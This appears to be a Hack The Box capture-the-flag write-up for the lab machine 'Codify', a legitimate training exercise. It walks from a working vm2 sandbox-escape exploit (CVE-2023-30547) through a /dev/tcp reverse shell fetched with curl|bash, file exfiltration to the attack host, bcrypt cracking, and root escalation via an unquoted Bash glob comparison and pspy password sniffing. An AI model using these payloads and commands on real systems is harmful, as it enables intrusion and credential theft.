# Codify

> **Hack The Box | Linux | Easy**
> Completed: May 2026

---

## Machine Metadata

| Field | Details |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux: Ubuntu 22.04.3 LTS |
| **Kernel** | 5.15.0-88-generic x86_64 |
| **Difficulty** | Easy |
| **Category** | Linux / Node.js Sandbox Escape / Bash Script Code Review |
| **IP Address** | 10.129.42.226 |
| **Attack Host** | 10.10.16.236 |
| **Status** | Retired ✅ |
| **Completed** | May 2026 |
| **CVEs** | CVE-2023-30547 (vm2 sandbox escape) |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full TCP scan: ports 22, 80, 3000 |: |
| 2 | Web enumeration: vm2 library identified on About Us page |: |
| 3 | CVE-2023-30547: vm2 sandbox escape via Proxy prototype chain | `svc` |
| 4 | Web directory enumeration: SQLite database in `/var/www/contact` |: |
| 5 | SQLite credential dump: bcrypt hash for `joshua` | `svc` |
| 6 | Hashcat bcrypt crack: `joshua:spongebob1` → SSH | `joshua` |
| 7 | `sudo -l` → `/opt/scripts/mysql-backup.sh` as root |: |
| 8 | Bash `[[ ]]` pattern matching bypass → pspy credential sniff | `root` |

---

## Enumeration

### Full TCP Port Scan

Two-phase scan: fast port discovery then targeted version detection:

```bash
Hackerpatel007_1@htb[/htb]$ ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.129.42.226 \
  | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
Hackerpatel007_1@htb[/htb]$ nmap -p$ports -Pn -sC -sV 10.129.42.226
```

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.42.226
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:5d:df:7d:c8:8d:f3 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 22.42 seconds
```

**Key findings:**

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 8.9p1 | No known RCE. Useful once credentials are found |
| 80 | Apache 2.4.52 | Redirects to `codify.htb`: add to `/etc/hosts` |
| 3000 | Node.js Express | Direct application: no redirect required |

### /etc/hosts Entry

```bash
Hackerpatel007_1@htb[/htb]$ echo '10.129.42.226 codify.htb' | sudo tee -a /etc/hosts
```

---

## Web Enumeration

### Port 80: codify.htb

Browsing to `http://codify.htb` loads a landing page: *"Codify: Test your Node.js code easily."* The application offers a browser-based Node.js code editor that executes user-supplied JavaScript in a sandboxed environment.

Three key pages to enumerate before touching the editor:

**About Us** (`/about`): explicitly names the sandboxing library in use:

> *"The vm2 library is a widely used and trusted tool for sandboxing JavaScript."*

This is the attack surface. `vm2` is a known target: search for CVEs immediately.

**Limitations** (`/limitations`): documents restricted modules and the whitelist:

```
Restricted (blocked):
  - child_process
  - fs

Whitelisted (allowed):
  - url, crypto, util, events, assert, stream, path, os, zlib
```

The intent is to block OS command execution via `child_process`. CVE-2023-30547 bypasses this restriction entirely at the sandbox level: the module blocklist becomes irrelevant.

### Port 3000: Node.js Editor

`http://10.129.42.226:3000` hosts the editor directly. The same vm2-sandboxed environment runs here. Both endpoints are valid exploit targets.

---

## Foothold: CVE-2023-30547 (vm2 Sandbox Escape)

### Vulnerability Background

CVE-2023-30547 affects **vm2 ≤ 3.9.16**. The vulnerability lies in improper sanitisation of exceptions within the `handleException()` function. When a host exception is raised via a crafted `Proxy` object with a recursive `getPrototypeOf` trap, the exception escapes the sandbox boundary and executes in the host Node.js context: with full access to `process`, `child_process`, and the entire Node.js API.

**Mechanism:**

1. A `Proxy` object wraps an empty error with a `getPrototypeOf` trap
2. The trap triggers an infinite recursive call stack (`new Error().stack`)
3. The resulting exception is not properly sanitised by `handleException()`
4. The exception handler executes in the host context
5. `constructor('return process')()` retrieves the host `process` object
6. `process.mainModule.require('child_process').execSync()` runs arbitrary OS commands as the `svc` user

### Step 1: Proof of Concept (RCE Verification)

Paste the following into the Codify editor at `http://codify.htb/editor` and click **Run**:

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('id');
}
`

console.log(vm.run(code));
```

**Output:**

```
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```

Sandbox escape confirmed. The `id` command executed on the host as user `svc`.

### Step 2: Reverse Shell via CVE-2023-30547

Create the reverse shell script on the attack host:

```bash
Hackerpatel007_1@htb[/htb]$ echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.16.236/4444 0>&1' > rev.sh
```

Start the Python HTTP server to serve it:

```bash
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8081
```

```
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
```

Start the netcat listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
```

Submit the modified PoC in the editor: replace `execSync('id')` with a `curl | bash` fetch:

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.16.236:8081/rev.sh|bash');
}
`

console.log(vm.run(code));
```

**Listener receives:**

```
Listening on 0.0.0.0 4444
connect to [10.10.16.236] from (UNKNOWN) [10.129.42.226] 53672
sh: 0: can't access tty; job control is turned off
$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
$
```

### Step 3: Upgrade to Stable PTY

```bash
$ script /dev/null -c bash
```

```
Script started, output log file is '/dev/null'.
svc@codify:~$
```

---

## Lateral Movement: svc → joshua

### Step 1: User Enumeration

No `user.txt` in `/home/svc`: a pivot to another user is required.

```bash
svc@codify:~$ cat /etc/passwd | grep -E "bash|sh$"
```

```
root:x:0:0:root:/root:/bin/bash
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
```

Two interactive users: `joshua` and `root`. Lateral movement target: `joshua`.

### Step 2: Enumerate Web Application Files

```bash
svc@codify:~$ ls -la /var/www/
```

```
total 20
drwxr-xr-x  5 root root 4096 Sep 12 17:40 .
drwxr-xr-x 13 root root 4096 Oct 31 07:57 ..
drwxr-xr-x  3 svc  svc  4096 Sep 12 17:45 contact
drwxr-xr-x  4 svc  svc  4096 Sep 12 17:46 editor
drwxr-xr-x  2 svc  svc  4096 Sep 12 17:45 html
```

```bash
svc@codify:~$ ls -la /var/www/contact/
```

```
total 36
drwxr-xr-x 3 svc svc  4096 Sep 12 17:45 .
drwxr-xr-x 5 root root 4096 Sep 12 17:40 ..
drwxr-xr-x 2 svc svc  4096 Sep 12 17:45 templates
-rw-r--r-- 1 svc svc   527 Sep 12 17:45 index.js
-rw-r--r-- 1 svc svc   527 Sep 12 17:45 package.json
-rw-r--r-- 1 svc svc  4096 Sep 12 17:45 package-lock.json
-rw-r--r-- 1 svc svc 20480 Sep 12 17:45 tickets.db
```

**`tickets.db`**: a SQLite database in the contact application directory. This is the credential source.

```bash
svc@codify:/var/www/contact$ file tickets.db
```

```
tickets.db: SQLite 3.x database, last written using SQLite version <...SNIP...> version-valid-for 17
```

### Step 3: Extract Credentials from SQLite Database

Query the database directly on the box:

```bash
svc@codify:/var/www/contact$ sqlite3 tickets.db
```

```
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
tickets  users
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
sqlite> .quit
```

**Hash extracted:** `$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`

The `$2a$` prefix identifies this as a **bcrypt** hash (Blowfish, cost factor 12). Hashcat mode `-m 3200`.

> **Alternative file transfer (if sqlite3 not available):** Transfer via `/dev/tcp`:
>
> ```bash
> # On attack host
> Hackerpatel007_1@htb[/htb]$ nc -lnvp 2222 > tickets.db
> # On target
> svc@codify:/var/www/contact$ cat tickets.db > /dev/tcp/10.10.16.236/2222
> ```

### Step 4: Crack bcrypt Hash with Hashcat

```bash
Hackerpatel007_1@htb[/htb]$ echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash.txt
Hackerpatel007_1@htb[/htb]$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

```
hashcat (v6.2.6) starting...

$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Time.Started.....: Sun Dec  3 05:56:08 2023 (1 min, 14 secs)
Time.Estimated...: Sun Dec  3 05:57:43 2023 (0 secs)
Recovered........: 1/1 (100.00%) Digests

Started: Sun Dec  3 05:56:08 2023
Stopped: Sun Dec  3 05:57:45 2023
```

**Credentials: `joshua:spongebob1`**

### Step 5: SSH as joshua

```bash
Hackerpatel007_1@htb[/htb]$ ssh joshua@10.129.42.226
joshua@10.129.42.226's password: spongebob1
```

```
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
Last login: Sun Dec  3 10:41:47 2023 from 10.10.14.83

joshua@codify:~$ id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)

joshua@codify:~$ cat user.txt
f2b9086cba4d5de0b61936380fcdc2a2
```

---

## Privilege Escalation: joshua → root

### Step 1: sudo Enumeration

```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua: spongebob1
```

```
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

`joshua` can run `/opt/scripts/mysql-backup.sh` as root without a password specified: only joshua's own sudo password is required.

### Step 2: Script Code Review

```bash
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
```

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
    /usr/bin/echo "Password confirmed!"
else
    /usr/bin/echo "Password confirmation failed!"
    exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" \
  | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" \
      | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

### Step 3: Identify Two Critical Flaws

**Flaw 1: Bash `[[ ]]` Pattern Matching (Password Bypass)**

The password comparison on line 8 uses:

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
```

In Bash, `[[ ]]` with `==` performs **glob pattern matching** when the right-hand side is **unquoted**. `$USER_PASS` is not quoted here. This means:

- If `USER_PASS` is `*`, bash evaluates `$DB_PASS == *`: this matches **any string** and returns true
- The actual root password is **never validated**: the check is entirely bypassed with a single `*` input

The secure version would be: `[[ "$DB_PASS" == "$USER_PASS" ]]` (quoted) or `[ "$DB_PASS" = "$USER_PASS" ]`.

**Flaw 2: Real Password Passed to mysqldump in Process Arguments**

After bypassing the password check, the script proceeds to call `mysqldump` using `$DB_PASS`: the **real** root credential read from `/root/.creds`. This password appears in the `mysqldump` command-line arguments, which are visible in `/proc/<PID>/cmdline` and captured by process monitoring tools like `pspy`.

**Combined exploitation path:**

1. Bypass the password check with `*`
2. The script proceeds and calls `mysqldump -p<real_root_password>`
3. Capture the real password from the process listing with `pspy`
4. Use the real password to `su root`

### Step 4: Transfer and Run pspy (SSH Session 1)

Open a second SSH session as `joshua`:

```bash
Hackerpatel007_1@htb[/htb]$ ssh joshua@10.129.42.226
```

Download pspy64 to the attack host, serve it, and fetch it on the target:

```bash
# On attack host
Hackerpatel007_1@htb[/htb]$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8082
```

```bash
# In SSH session 1 (joshua)
joshua@codify:~$ wget http://10.10.16.236:8082/pspy64s
joshua@codify:~$ chmod +x pspy64s
joshua@codify:~$ ./pspy64s -i 1
```

```
pspy - version: v1.2.0
Draining file system events due to startup...
done
```

### Step 5: Trigger the Script (SSH Session 2)

In the second SSH session, run the backup script as root and enter `*` when prompted for the MySQL password:

```bash
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
[sudo] password for joshua: spongebob1
Enter MySQL password for root: *
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
Backing up database: sys
All databases backed up successfully!
Changing the permissions
Done!
```

### Step 6: Capture Root Password via pspy

Immediately after the script runs, pspy in session 1 captures the full `mysqldump` command-line including the password:

```
2023/12/03 11:36:57 CMD: UID=0  PID=13122 | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 mysql
```

**Root MySQL password (= root system password): `kljh12k3jhaskjh12kjh3`**

The `-p` flag in `mysqldump` accepts the password immediately without a space: `-pkljh12k3jhaskjh12kjh3`.

### Step 7: Switch to Root

```bash
joshua@codify:~$ su root
Password: kljh12k3jhaskjh12kjh3
```

```
root@codify:/home/joshua# id
uid=0(root) gid=0(root) groups=0(root)

root@codify:/home/joshua# cd /root
root@codify:~# ls
root.txt  scripts
```

---

## Flag Collection

### user.txt

```bash
joshua@codify:~$ cat /home/joshua/user.txt
```

```
f2b9086cba4d5de0b61936380fcdc2a2
```

### root.txt

```bash
root@codify:~$ cat /root/root.txt
```

```
e3d009fc1557c8edb826de126e8a6826
```

### Flag Summary

| Flag | Location | Hash |
|---|---|---|
| **user.txt** | `/home/joshua/user.txt` | `f2b9086cba4d5de0b61936380fcdc2a2` |
| **root.txt** | `/root/root.txt` | `e3d009fc1557c8edb826de126e8a6826` |

---

## Full Attack Chain Reference

```
[Recon] nmap → ports 22/80/3000, codify.htb, Node.js Express on 3000
    │
    ├─[Web] /about → vm2 library identified
    │        └─[Limitations] child_process + fs blocked (irrelevant: CVE bypasses at sandbox level)
    │
    └─[CVE-2023-30547] vm2 ≤ 3.9.16 Proxy prototype chain sandbox escape
            │
            └─[Shell] uid=1001(svc): reverse shell via curl|bash
                    │
                    └─[Enum] /var/www/contact/tickets.db → SQLite database
                            │
                            └─[sqlite3] select * from users → joshua bcrypt hash
                                    │
                                    └─[hashcat -m 3200] → joshua:spongebob1
                                            │
                                            └─[SSH] joshua@codify.htb
                                                    │
                                                    ├─ user.txt → f2b9086cba4d5de0b61936380fcdc2a2
                                                    │
                                                    └─[sudo -l] → /opt/scripts/mysql-backup.sh
                                                            │
                                                            ├─[Flaw 1] [[ ]] unquoted pattern match → * bypasses password check
                                                            └─[Flaw 2] DB_PASS passed to mysqldump cmdline → visible in pspy
                                                                    │
                                                                    └─[pspy] captures -pkljh12k3jhaskjh12kjh3
                                                                            │
                                                                            └─[su root] → root
                                                                                    └─ root.txt → e3d009fc1557c8edb826de126e8a6826
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -Pn -p- --min-rate=1000 -T4 10.129.42.226` | Fast full port discovery |
| `nmap -p22,80,3000 -Pn -sC -sV 10.129.42.226` | Service version + script scan |
| `echo '10.129.42.226 codify.htb' | sudo tee -a /etc/hosts` | Add vhost resolution |
| vm2 CVE-2023-30547 PoC (in browser editor) | Sandbox escape → RCE as svc |
| `echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.16.236/4444 0>&1' > rev.sh` | Create reverse shell script |
| `python3 -m http.server 8081` | Serve rev.sh to target |
| `nc -lvnp 4444` | Catch reverse shell |
| `script /dev/null -c bash` | Upgrade to stable PTY |
| `sqlite3 tickets.db` | Open SQLite database |
| `.tables` / `select * from users;` | Dump credential table |
| `hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt` | Crack bcrypt hash |
| `ssh joshua@10.129.42.226` | SSH with cracked credentials |
| `sudo -l` | Enumerate joshua's sudo rights |
| `cat /opt/scripts/mysql-backup.sh` | Review script for code flaws |
| `wget http://10.10.16.236:8082/pspy64s && chmod +x pspy64s && ./pspy64s -i 1` | Monitor processes for password leak |
| `sudo /opt/scripts/mysql-backup.sh` → input `*` | Trigger pattern match bypass + mysqldump |
| `su root` | Authenticate with snooped root password |

---

## Lessons Learned

**1. Application `About` pages and documentation expose the attack surface.**
The vm2 library was identified not through scanning or fuzzing but by reading the application's own "About Us" page. Always read web application content before reaching for tools: developers often document exactly what's running.

**2. Module blocklists do not substitute for secure sandbox implementation.**
The Limitations page advertised that `child_process` and `fs` were blocked. CVE-2023-30547 bypasses these restrictions at the JavaScript engine level: the blocklist is irrelevant when the sandbox itself is compromised. Sandboxing must be implemented at the OS level (containers, namespaces) for genuine isolation.

**3. SQLite databases in web directories are credential goldmines.**
`/var/www/contact/tickets.db` was readable by `svc` because the web application needed access to it. Anytime you land on a web server account, enumerate all web application directories for databases, config files, and credential stores.

**4. bcrypt is slow by design: rockyou still cracks weak passwords.**
bcrypt with cost factor 12 (`$2a$12$`) is intentionally compute-expensive. Hashcat managed ~18 H/s on this hash. `spongebob1` is in rockyou.txt and cracked in ~1.5 minutes. Bcrypt protects against bulk cracking but not dictionary attacks against weak passwords.

**5. Unquoted variables in Bash `[[ ]]` conditionals enable pattern matching attacks.**
`[[ $DB_PASS == $USER_PASS ]]` with unquoted `$USER_PASS` performs glob matching. Inputting `*` matches any value: the comparison always evaluates to true. This is a well-documented Bash pitfall. The secure equivalent: `[[ "$DB_PASS" == "$USER_PASS" ]]`. Always quote both sides in sensitive comparisons.

**6. Command-line arguments are visible to all users via /proc.**
Passwords passed as CLI arguments (`-p<password>`) are not secrets: they appear in `/proc/<PID>/cmdline` and process monitoring tools like `pspy`. `mysqldump -p<password>` is explicitly flagged with `[Warning] Using a password on the command line interface can be insecure.` The script itself warns about this. Credentials should be passed via environment variables, config files with restricted permissions, or stdin: never as positional arguments.

**7. pspy requires no elevated privileges and is indispensable for credential snooping.**
pspy monitors process creation by watching `/proc` inotify events. It requires zero privileges and has no footprint beyond the binary itself. On any machine where credential exposure via process arguments is suspected, pspy is the first tool to deploy.

---

## References

- [CVE-2023-30547: NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-30547)
- [vm2 Security Advisory: GitHub](https://github.com/patriksimek/vm2/security/advisories/GHSA-ch3r-j5x3-6q2m)
- [pspy: DominicBreuker](https://github.com/DominicBreuker/pspy)
- [Bash Pattern Matching in [[ ]]](https://www.gnu.org/software/bash/manual/bash.html#Pattern-Matching)
- [GTFOBins: Bash](https://gtfobins.github.io/gtfobins/bash/)
- [Hashcat Mode Reference](https://hashcat.net/wiki/doku.php?id=hashcat)

---

*HTB Retired Machine: Codify | Completed May 2026 | Flags included per HTB retired machine policy.*
